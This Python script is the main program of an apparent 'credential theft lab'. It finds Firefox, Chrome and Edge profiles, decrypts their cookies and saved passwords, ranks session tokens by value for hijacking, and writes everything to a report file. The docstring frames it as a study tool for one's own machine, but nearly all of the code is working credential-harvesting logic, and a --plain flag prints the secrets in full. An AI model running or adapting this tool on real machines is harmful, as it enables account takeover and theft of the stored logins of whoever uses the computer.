#!/usr/bin/env python3
"""browser-credential-theft-lab -- dump Firefox and Chrome/Edge cookies + saved logins.

STUDY TOOL FOR YOUR OWN MACHINE ONLY. See README.md for how session
hijacking works and for the ethics / authorization rules.

Usage:
  python3 creds_dumper.py                      # dump Firefox + Chrome/Edge
  python3 creds_dumper.py --browser firefox    # Firefox only
  python3 creds_dumper.py --browser chrome     # Chrome only
  python3 creds_dumper.py --browser edge       # Edge only
  python3 creds_dumper.py --profile <dir>      # one specific Firefox profile
  python3 creds_dumper.py --plain              # also print full secrets to console
  python3 creds_dumper.py --list               # list discovered profiles, no dump

Firefox needs no third-party packages. Chrome/Edge need pycryptodome:
  pip install -r requirements.txt

Close the browser you are dumping BEFORE running -- both Firefox and Chrome
file-lock their SQLite databases and keep session-only cookies in memory
until a clean shutdown.
"""

from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from lib import (  # noqa: E402
    chrome_cookies,
    chrome_crypto,
    chrome_logins,
    chrome_profiles,
    firefox_cookies,
    firefox_logins,
    nss,
    profiles,
    report,
)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Dump Firefox / Chrome / Edge cookies and saved logins "
                    "(own machine / lab only)."
    )
    p.add_argument(
        "--browser",
        choices=["all", "firefox", "chrome", "edge"],
        default="all",
        help="Which browser(s) to dump (default: all)",
    )
    p.add_argument(
        "--profile",
        help="Path to a specific Firefox profile folder "
             "(default: all profiles via profiles.ini)",
    )
    p.add_argument(
        "--plain",
        action="store_true",
        help="Print full cookie/login values to the console (default: masked previews)",
    )
    p.add_argument(
        "--out",
        default="report",
        help="Directory for the full report file (default: ./report)",
    )
    p.add_argument(
        "--list",
        action="store_true",
        help="List discovered profiles and exit",
    )
    p.add_argument(
        "--no-logins",
        action="store_true",
        help="Skip saved-login decryption (still dumps cookies)",
    )
    p.add_argument(
        "--password",
        help="Firefox Primary Password, if the profile is protected",
    )
    return p.parse_args()


# --------------------------------------------------------------------------- #
# Firefox                                                                     #
# --------------------------------------------------------------------------- #
def dump_firefox_one(profile: profiles.Profile, args: argparse.Namespace) -> dict:
    """Run the harvest for a single Firefox profile, return its report dict."""
    print(f"\n=== Profile: {profile.name} ({profile.path}) ===")

    cookies = firefox_cookies.dump_cookies(profile.path)
    high = [c for c in cookies if c.high_value]
    total = len(cookies)

    print(f"\n  Cookies: {total} total, {len(high)} high-value session tokens")

    if high:
        print("\n  High-value session cookies:")
        for c in sorted(high, key=lambda c: c.host):
            report.print_cookie_console(c, args.plain)
        print("\n  All cookies:")
    else:
        print("\n  All cookies:")
    for c in cookies:
        report.print_cookie_console(c, args.plain)

    logins: list = []
    if not args.no_logins:
        try:
            nss_session = nss.NSS()
            nss_session.initialize(profile.path)
            try:
                if nss_session.needs_login():
                    password = args.password
                    if password is None:
                        password = input(
                            f"  Profile '{profile.name}' has a Primary Password: "
                        )
                    nss_session.unlock(password)
            except nss.NSSDecryptError as exc:
                print(f"\n  [warn] {exc} -- skipping logins for this profile")
                nss_session = None
            if nss_session is not None:
                logins = firefox_logins.dump_logins(profile.path, nss_session)
                nss_session.shutdown()
        except nss.NSSNotFoundError as exc:
            print(f"\n  [warn] {exc}\n  Skipping saved logins (cookies already dumped).")
        except Exception as exc:  # noqa: BLE001 - a login failure must not kill the cookie dump
            print(f"\n  [warn] Logins skipped: {exc}")

    if logins:
        print(f"\n  Saved logins: {len(logins)}")
        for l in logins:
            report.print_login_console(l, args.plain)
    else:
        print("\n  Saved logins: none (no logins.json / nothing remembered)")

    return {
        "browser": "firefox",
        "name": profile.name,
        "path": profile.path,
        "cookie_count": total,
        "high_value_count": len(high),
        "cookies": [c.to_dict() for c in cookies],
        "logins": [l.to_dict() for l in logins],
    }


def dump_firefox(args: argparse.Namespace) -> list[dict]:
    if args.profile:
        found = [profiles.Profile(name=os.path.basename(args.profile), path=args.profile)]
    else:
        try:
            found = profiles.discover_profiles()
        except FileNotFoundError as exc:
            print(f"[!] {exc}", file=sys.stderr)
            return []

    if args.list:
        for p in found:
            print(f"{p.name:<30} {p.path}")
        return []

    if not found:
        print("[!] No Firefox profiles found.", file=sys.stderr)
        return []

    print(f"[*] Firefox: {len(found)} profile(s). "
          f"Dump reads from disk copies -- no login, no network, no browser needed.")
    return [dump_firefox_one(p, args) for p in found]


# --------------------------------------------------------------------------- #
# Chrome / Edge                                                               #
# --------------------------------------------------------------------------- #
def dump_chromium(args: argparse.Namespace, browser: str) -> list[dict]:
    found = chrome_profiles.discover_profiles(browser)
    if args.list:
        for p in found:
            print(f"{p.name:<30} {p.path}  ({p.browser})")
        return []

    if not found:
        print(f"[!] No {browser} profiles found.", file=sys.stderr)
        return []

    # One AES key per browser User Data root (shared by all its profiles).
    keys: dict[str, bytes] = {}
    for p in found:
        if p.root not in keys:
            try:
                keys[p.root] = chrome_crypto.get_key(p.root)
            except chrome_crypto.ChromeKeyError as exc:
                print(f"[!] {exc}", file=sys.stderr)
                print("[!] Skipping all profiles under this root.\n", file=sys.stderr)
                continue

    results: list[dict] = []
    for p in found:
        key = keys.get(p.root)
        if key is None:
            continue
        results.append(dump_chromium_one(p, key, args))

    if not results:
        print(f"[!] {browser}: nothing dumped (no recoverable key).", file=sys.stderr)
    return results


def dump_chromium_one(p: chrome_profiles.ChromiumProfile, key: bytes,
                      args: argparse.Namespace) -> dict:
    print(f"\n=== {p.browser} profile: {p.name} ({p.path}) ===")

    cookies = chrome_cookies.dump_cookies(p.path, key)
    high = [c for c in cookies if c.high_value]
    total = len(cookies)

    print(f"\n  Cookies: {total} total, {len(high)} high-value session tokens")

    if high:
        print("\n  High-value session cookies:")
        for c in sorted(high, key=lambda c: c.host):
            report.print_cookie_console(c, args.plain)
        print("\n  All cookies:")
    else:
        print("\n  All cookies:")
    for c in cookies:
        report.print_cookie_console(c, args.plain)

    logins: list = []
    if not args.no_logins:
        try:
            logins = chrome_logins.dump_logins(p.path, key)
        except Exception as exc:  # noqa: BLE001 - never kill the dump
            print(f"\n  [warn] Logins skipped: {exc}")

    if logins:
        print(f"\n  Saved logins: {len(logins)}")
        for l in logins:
            report.print_login_console(l, args.plain)
    else:
        print("\n  Saved logins: none (nothing remembered)")

    return {
        "browser": p.browser,
        "name": p.name,
        "path": p.path,
        "cookie_count": total,
        "high_value_count": len(high),
        "cookies": [c.to_dict() for c in cookies],
        "logins": [l.to_dict() for l in logins],
    }


# --------------------------------------------------------------------------- #
# Entry point                                                                 #
# --------------------------------------------------------------------------- #
def main() -> int:
    args = parse_args()

    if args.list:
        if args.browser in ("all", "firefox"):
            dump_firefox(args)
        if args.browser in ("all", "chrome", "edge"):
            if args.browser == "chrome":
                dump_chromium(args, "chrome")
            elif args.browser == "edge":
                dump_chromium(args, "edge")
            else:
                dump_chromium(args, "chrome")
                dump_chromium(args, "edge")
        return 0

    selected = (
        {"firefox", "chrome", "edge"} if args.browser == "all" else {args.browser}
    )

    results: list[dict] = []
    for b in sorted(selected):
        if b == "firefox":
            results += dump_firefox(args)
        else:
            results += dump_chromium(args, b)

    if not results:
        print("[!] Nothing to dump.", file=sys.stderr)
        return 2

    path = report.write_report(results, args.out)
    totals = sum(r["high_value_count"] for r in results)
    print(f"\n[*] Report written to {path}")
    print(f"[*] {totals} high-value session token(s) harvested across "
          f"{len(results)} profile(s).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
